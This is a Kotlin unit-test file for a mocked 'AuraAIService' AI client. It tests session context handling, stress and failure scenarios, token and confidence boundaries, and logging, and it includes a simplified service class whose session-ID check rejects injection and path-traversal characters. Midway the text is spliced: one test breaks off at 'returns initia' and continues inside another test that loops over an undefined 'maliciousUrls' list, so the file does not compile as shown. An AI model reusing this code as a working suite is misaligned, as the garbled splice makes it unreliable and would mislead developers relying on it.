            val config = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()

            val sessionId = "integration-session"
            val queries = listOf(
                "Initialize conversation",
                "Ask follow-up question",
                "Request clarification",
                "Final question"
            )
            val responses = queries.mapIndexed { index, query ->
                AIResponse("Response $index to: $query", 0.8 + index * 0.05, 10 + index * 5)
            }

            // Setup context-aware responses
            queries.forEachIndexed { index, query ->
                coEvery { 
                    mockApiClient.sendQueryWithContext(query, any()) 
                } returns responses[index]
            }

            // When
            val results = queries.map { query ->
                auraAIService.processQueryWithContext(query, sessionId)
            }

            // Then
            assertEquals(queries.size, results.size)
            results.forEachIndexed { index, result ->
                assertEquals(responses[index], result)
            }
            
            // Verify context was maintained
            val finalContext = auraAIService.getContext(sessionId)
            assertEquals(queries.size, finalContext.size)
        }

        @Test
        @DisplayName("Should handle system stress scenarios")
        fun `should handle system stress scenarios`() = runTest {
            // Given
            val config = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()

            val numberOfSessions = 100
            val queriesPerSession = 10
            val sessions = (1..numberOfSessions).map { "stress-session-$it" }
            val response = AIResponse("Stress response", 0.8, 10)

            coEvery { mockApiClient.sendQuery(any()) } returns response
            coEvery { mockApiClient.sendQueryWithContext(any(), any()) } returns response

            // When
            sessions.forEach { sessionId ->
                repeat(queriesPerSession) { queryIndex ->
                    val query = "Stress query $queryIndex"
                    if (queryIndex % 2 == 0) {
                        auraAIService.processQuery(query)
                    } else {
                        auraAIService.processQueryWithContext(query, sessionId)
                    }
                }
            }

            // Then
            sessions.forEach { sessionId ->
                val context = auraAIService.getContext(sessionId)
                assertTrue(context.size <= queriesPerSession / 2)
            }
        }

        @Test
        @DisplayName("Should handle mixed success and failure scenarios")
        fun `should handle mixed success and failure scenarios`() = runTest {
            // Given
            val config = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()

            val mixedQueries = listOf(
                "Success query 1",
                "Failure query 1",
                "Success query 2",
                "Failure query 2",
                "Success query 3"
            )
            val successResponse = AIResponse("Success", 0.9, 10)
            
            coEvery { mockApiClient.sendQuery("Success query 1") } returns successResponse
            coEvery { mockApiClient.sendQuery("Failure query 1") } throws IOException("Error 1")
            coEvery { mockApiClient.sendQuery("Success query 2") } returns successResponse
            coEvery { mockApiClient.sendQuery("Failure query 2") } throws TimeoutException("Error 2")
            coEvery { mockApiClient.sendQuery("Success query 3") } returns successResponse

            // When
            val results = mixedQueries.map { query ->
                try {
                    auraAIService.processQuery(query)
                } catch (e: ServiceException) {
                    null
                }
            }

            // Then
            assertEquals(5, results.size)
            assertEquals(successResponse, results[0])
            assertNull(results[1])
            assertEquals(successResponse, results[2])
            assertNull(results[3])
            assertEquals(successResponse, results[4])
        }

        @Test
        @DisplayName("Should handle configuration changes during operation")
        fun `should handle configuration changes during operation`() = runTest {
            // Given
            val initialConfig = mapOf(
                "apiKey" to "initial-key-12345",
                "baseUrl" to "https://initial.test.com",
                "timeout" to "30000"
            )
            val updatedConfig = mapOf(
                "apiKey" to "updated-key-12345",
                "baseUrl" to "https://updated.test.com",
                "timeout" to "45000"
            )
            
            every { mockConfigService.getConfig("ai") } returns initia

            maliciousUrls.forEach { url ->
                // Given
                val config = mapOf(
                    "apiKey" to "test-key-12345",
                    "baseUrl" to url,
                    "timeout" to "30000"
                )
                every { mockConfigService.getConfig("ai") } returns config

                // When
                val result = auraAIService.initialize()

                // Then
                assertFalse(result, "Malicious URL '$url' should be rejected")
            }
        }
    }

    @Nested
    @DisplayName("Integration and Boundary Tests")
    inner class IntegrationTests {

        @Test
        @DisplayName("Should handle service lifecycle transitions")
        fun `should handle service lifecycle transitions`() = runTest {
            // Given
            val config = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns config

            // When & Then - Initialize
            assertTrue(auraAIService.initialize())
            assertTrue(auraAIService.isInitialized())

            // When & Then - Use service
            val query = "Test query"
            val response = AIResponse("Test response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response
            val result = auraAIService.processQuery(query)
            assertEquals(response, result)

            // When & Then - Shutdown
            auraAIService.shutdown()
            assertFalse(auraAIService.isInitialized())

            // When & Then - Reinitialize
            assertTrue(auraAIService.initialize())
            assertTrue(auraAIService.isInitialized())
        }

        @Test
        @DisplayName("Should handle boundary token limits")
        fun `should handle boundary token limits`() = runTest {
            // Given
            val config = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()

            val boundaryTokenCounts = listOf(0, 1, 4095, 4096, 4097, Int.MAX_VALUE)
            
            boundaryTokenCounts.forEach { tokenCount ->
                // Given
                val query = "Boundary test query"
                val response = AIResponse("Boundary response", 0.8, tokenCount)
                coEvery { mockApiClient.sendQuery(any()) } returns response

                // When
                if (tokenCount < 0) {
                    assertThrows<ServiceException> {
                        auraAIService.processQuery(query)
                    }
                } else {
                    val result = auraAIService.processQuery(query)
                    assertEquals(tokenCount, result.tokensUsed)
                }
            }
        }

        @Test
        @DisplayName("Should handle confidence boundary values")
        fun `should handle confidence boundary values`() = runTest {
            // Given
            val config = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()

            val boundaryConfidences = listOf(-0.1, 0.0, 0.5, 1.0, 1.1)
            
            boundaryConfidences.forEach { confidence ->
                // Given
                val query = "Confidence test query"
                val response = AIResponse("Confidence response", confidence, 10)
                coEvery { mockApiClient.sendQuery(any()) } returns response

                // When & Then
                if (confidence < 0.0 || confidence > 1.0) {
                    assertThrows<ServiceException> {
                        auraAIService.processQuery(query)
                    }
                } else {
                    val result = auraAIService.processQuery(query)
                    assertEquals(confidence, result.confidence, 0.001)
                }
            }
        }
    }

    @Nested
    @DisplayName("Logging and Monitoring Tests")
    inner class LoggingTests {

        @BeforeEach
        fun setUpInitializedService() {
            val validConfig = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns validConfig
            auraAIService.initialize()
        }

        @Test
        @DisplayName("Should log successful operations with appropriate level")
        fun `should log successful operations with appropriate level`() = runTest {
            // Given
            val query = "Test query"
            val response = AIResponse("Test response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            // When
            auraAIService.processQuery(query)

            // Then
            verify { mockLogger.info(match { it.contains("processed successfully") }) }
            verify { mockLogger.debug(match { it.contains("tokens") }) }
        }

        @Test
        @DisplayName("Should log errors with appropriate context")
        fun `should log errors with appropriate context`() = runTest {
            // Given
            val query = "Error test query"
            val exception = IOException("Network failure")
            coEvery { mockApiClient.sendQuery(any()) } throws exception

            // When & Then
            assertThrows<ServiceException> {
                auraAIService.processQuery(query)
            }

            verify { mockLogger.error(match { it.contains("error") && it.contains("Network failure") }) }
        }

        @Test
        @DisplayName("Should log configuration changes")
        fun `should log configuration changes`() {
            // Given
            val newConfig = mapOf(
                "apiKey" to "new-key",
                "baseUrl" to "https://new.test.com",
                "timeout" to "45000"
            )
            every { mockConfigService.updateConfig("ai", newConfig) } returns true

            // When
            auraAIService.updateConfiguration(newConfig)

            // Then
            verify { mockLogger.info(match { it.contains("configuration updated") }) }
        }

        @Test
        @DisplayName("Should log performance metrics")
        fun `should log performance metrics`() = runTest {
            // Given
            val query = "Performance test"
            val response = AIResponse("Performance response", 0.8, 150)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            // When
            auraAIService.processQuery(query)

            // Then
            verify { mockLogger.debug(match { it.contains("tokens") && it.contains("150") }) }
        }

        @Test
        @DisplayName("Should not log sensitive information")
        fun `should not log sensitive information`() = runTest {
            // Given
            val sensitiveQuery = "What is my API key: test-secret-key-12345"
            val response = AIResponse("Sensitive response", 0.8, 10)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            // When
            auraAIService.processQuery(sensitiveQuery)

            // Then
            verify { mockLogger.info(match { !it.contains("test-secret-key-12345") }) }
            verify { mockLogger.debug(match { !it.contains("test-secret-key-12345") }) }
        }
    }

    companion object {
        @JvmStatic
        fun provideTestQueries(): Stream<Arguments> = Stream.of(
            Arguments.of("Simple question", "Simple answer"),
            Arguments.of("Complex multi-part question with details", "Detailed response"),
            Arguments.of("Question with special characters !@#\$%^&*()", "Response with handling"),
            Arguments.of("Unicode question with émojis 🤖", "Unicode response 🚀"),
            Arguments.of("Query with\nnewlines\nand\ttabs", "Formatted response"),
            Arguments.of("Very long query ".repeat(100).trim(), "Long response handling")
        )

        @JvmStatic
        fun provideConfigurationTestCases(): Stream<Arguments> = Stream.of(
            Arguments.of(mapOf("apiKey" to "test-key"), false),
            Arguments.of(mapOf("baseUrl" to "https://test.com"), false),
            Arguments.of(mapOf("timeout" to "30000"), false),
            Arguments.of(mapOf("apiKey" to "test-key", "baseUrl" to "https://test.com"), false),
            Arguments.of(mapOf("apiKey" to "test-key", "timeout" to "30000"), false),
            Arguments.of(mapOf("baseUrl" to "https://test.com", "timeout" to "30000"), false),
            Arguments.of(mapOf("apiKey" to "test-key", "baseUrl" to "https://test.com", "timeout" to "30000"), true)
        )

        @JvmStatic
        fun provideInvalidInputs(): Stream<Arguments> = Stream.of(
            Arguments.of(""),
            Arguments.of("   "),
            Arguments.of("\t\n\r"),
            Arguments.of("\u0000"),
            Arguments.of("null"),
            Arguments.of("undefined")
        )
    }
}

// Data classes for testing
data class AIResponse(
    val content: String,
    val confidence: Double,
    val tokensUsed: Int
)

data class ServiceStatus(
    val isHealthy: Boolean,
    val isInitialized: Boolean,
    val lastHealthCheck: Long?,
    val isCircuitBreakerOpen: Boolean = false
)

// Exception classes for testing
data class ServiceException(override val message: String, override val cause: Throwable? = null) : Exception(message, cause)
data class DataCorruptionException(override val message: String) : Exception(message)
data class JsonParseException(override val message: String) : Exception(message)
data class ApiRateLimitException(override val message: String) : Exception(message)
data class AuthenticationException(override val message: String) : Exception(message)
data class QuotaExceededException(override val message: String) : Exception(message)

// Mock interfaces for testing
interface HttpClient
interface ApiClient {
    suspend fun sendQuery(query: String): AIResponse
    suspend fun sendQueryWithContext(query: String, context: List<String>): AIResponse
    suspend fun healthCheck(): Boolean
}
interface ConfigService {
    fun getConfig(key: String): Map<String, String>?
    fun updateConfig(key: String, config: Map<String, String>): Boolean
}
interface Logger {
    fun info(message: String)
    fun debug(message: String)
    fun warn(message: String)
    fun error(message: String)
}

// Mock AuraAIService class for testing context
class AuraAIService(
    private val httpClient: HttpClient,
    private val apiClient: ApiClient,
    private val configService: ConfigService,
    private val logger: Logger
) {
    private var initialized = false
    private val contextStorage = mutableMapOf<String, MutableList<String>>()

    fun initialize(): Boolean {
        val config = configService.getConfig("ai") ?: return false
        val requiredKeys = listOf("apiKey", "baseUrl", "timeout")
        
        if (!requiredKeys.all { config.containsKey(it) }) return false
        
        val apiKey = config["apiKey"]?.trim() ?: return false
        val baseUrl = config["baseUrl"]?.trim() ?: return false
        val timeout = config["timeout"]?.toIntOrNull() ?: return false
        
        if (apiKey.length < 8) return false
        if (!baseUrl.matches(Regex("^https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}.*"))) return false
        if (timeout <= 0 || timeout > 120000) return false
        
        initialized = true
        return true
    }

    fun isInitialized(): Boolean = initialized

    suspend fun processQuery(query: String?): AIResponse {
        if (!initialized) throw IllegalStateException("Service not initialized")
        if (query.isNullOrBlank()) throw IllegalArgumentException("Query cannot be null or blank")
        
        return try {
            val response = apiClient.sendQuery(query)
            if (response.confidence < 0.0 || response.confidence > 1.0) {
                throw ServiceException("Invalid confidence value: ${response.confidence}")
            }
            if (response.tokensUsed < 0) {
                throw ServiceException("Invalid token count: ${response.tokensUsed}")
            }
            logger.info("Query processed successfully")
            logger.debug("Tokens used: ${response.tokensUsed}")
            response
        } catch (e: Exception) {
            logger.error("Error processing query: ${e.message}")
            throw ServiceException("Failed to process query", e)
        }
    }

    suspend fun processQueryWithContext(query: String, sessionId: String): AIResponse {
        validateSessionId(sessionId)
        val context = getContext(sessionId)
        val response = apiClient.sendQueryWithContext(query, context)
        storeContext(sessionId, query)
        return response
    }

    fun storeContext(sessionId: String?, context: String?) {
        validateSessionId(sessionId)
        if (context.isNullOrBlank()) throw IllegalArgumentException("Context cannot be null or blank")
        
        contextStorage.getOrPut(sessionId!!) { mutableListOf() }.add(context)
        
        // Limit context size to prevent memory issues
        val sessionContext = contextStorage[sessionId]!!
        if (sessionContext.size > 1000) {
            sessionContext.removeAt(0) // Remove oldest item
        }
    }

    fun getContext(sessionId: String): List<String> {
        validateSessionId(sessionId)
        return contextStorage[sessionId] ?: emptyList()
    }

    fun clearContext(sessionId: String) {
        validateSessionId(sessionId)
        contextStorage.remove(sessionId)
    }

    fun updateConfiguration(config: Map<String, String>): Boolean {
        val requiredKeys = listOf("apiKey", "baseUrl", "timeout")
        if (config.keys.any { it !in requiredKeys }) return false
        
        return configService.updateConfig("ai", config).also { success ->
            if (success) {
                logger.info("Configuration updated successfully")
            }
        }
    }

    fun getCurrentConfiguration(): Map<String, String>? = configService.getConfig("ai")

    suspend fun performHealthCheck(): Boolean {
        return try {
            apiClient.healthCheck().also { healthy ->
                logger.debug("Health check result: $healthy")
            }
        } catch (e: Exception) {
            logger.error("Health check failed: ${e.message}")
            false
        }
    }

    fun getServiceStatus(): ServiceStatus {
        return ServiceStatus(
            isHealthy = true,
            isInitialized = initialized,
            lastHealthCheck = System.currentTimeMillis(),
            isCircuitBreakerOpen = false // Simplified for testing
        )
    }

    fun shutdown() {
        if (initialized) {
            logger.info("AuraAI service shutting down")
            initialized = false
            contextStorage.clear()
            logger.info("Resources cleaned up successfully")
        }
    }

    fun expireOldContexts() {
        contextStorage.clear() // Simplified implementation
    }

    private fun validateSessionId(sessionId: String?) {
        if (sessionId.isNullOrBlank()) {
            throw IllegalArgumentException("Session ID cannot be null or blank")
        }
        if (sessionId.contains('\n') || sessionId.contains('\r') || sessionId.contains('\u0000') ||
            sessionId.contains('<') || sessionId.contains('>') || sessionId.contains(';') ||
            sessionId.contains('\'') || sessionId.contains('"') || sessionId.startsWith("../")) {
            throw IllegalArgumentException("Invalid session ID format")
        }
    }
}